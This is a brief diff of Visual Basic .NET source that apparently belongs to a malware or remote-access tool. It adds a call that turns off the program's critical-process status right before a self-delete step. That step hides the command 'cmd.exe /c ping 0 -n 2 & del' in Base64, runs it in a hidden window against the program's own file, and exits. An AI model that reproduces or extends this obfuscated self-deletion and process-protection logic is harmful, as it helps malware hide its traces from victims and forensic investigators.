@@ -51,6 +51,8 @@
                     Threading.Thread.Sleep(50)
                 End If
 
+                C_CriticalProcesses.CriticalProcesses_Disable()
+
                 'cmd.exe /c ping 0 -n 2 & del 
                 Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & C_Settings.fullpath & """", AppWinStyle.Hide, False, -1) 'Delete NEXE
                 End
